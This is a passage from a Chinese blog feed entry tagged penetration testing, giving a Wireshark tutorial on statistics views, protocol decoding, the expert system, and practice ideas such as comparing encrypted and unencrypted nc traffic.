class="headerlink" title="信息统计"></a>信息统计</h2><p><strong>1.查看导入数据包文件摘要信息</strong><br>导入数据包文件，打开“统计”-&gt;“文件属性”：可以看到一些摘要性的信息</p><p><strong>2.节点数</strong><br>打开“统计”-&gt;“endpoint”： 可以以ip地址区分/udp有多少/二层的包头/其他标准区分 节点的个数等<br>Tx表示发送, Rx表示接收的数据包</p><p><strong>3.协议分布</strong><br>打开“统计”-&gt;“协议分级”：可以看到每个协议里面什么协议的占用百分比(DNS流量占用一般都很小,否则很有可能出现异常)</p><p><strong>4.包大小分布</strong><br>打开“统计”-&gt;“分组长度”：可以看到大包多还是小包多</p><p><strong>5.会话连接</strong><br>打开“统计”-&gt;“conversations”：可以看到哪两台机器之间数据包会话传送最多啥的</p><p><strong>6.解码方式</strong><br>对于非默认端口的数据包，wiresharl只会按端口区分的<br>右键, 手动decode为指定的协议， 这样wireshark就会按正确的协议来解析</p><blockquote><p>需要熟悉不同协议数据包的内容, 防止手动解析错误</p></blockquote><p><strong>7.专家系统</strong><br>“分析” -&gt; “专家系统”:  可能自动给我们一些提示</p><blockquote><p>思路：如果很多个数据包，先从统计信息入手，分析出重点，找出方向。然后筛选出来，逐步分析包的内容</p></blockquote><h2 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h2><ul><li>抓包对比nc、ncta加密与不加密的流量</li><li>企业抓包部署方案  (Wiershark也有不足，大型网络还是需要商业化的软件)<ul><li>Sniffer</li><li>Cace / riverbed （大部分还是基于wireshark进行了二次开发，改名了应该, 如果需要去网上找吧）</li><li>Cascad pilot</li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;/工具-Wireshark使用/title.png&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="渗透测试" scheme="http://www.xpshuai.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="渗透测试" scheme="http://www.xpshuai.cn/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="Wireshark" scheme="http://www.xpshuai.cn/tags/Wireshark/"/>
    
  </entry>
  
</feed>
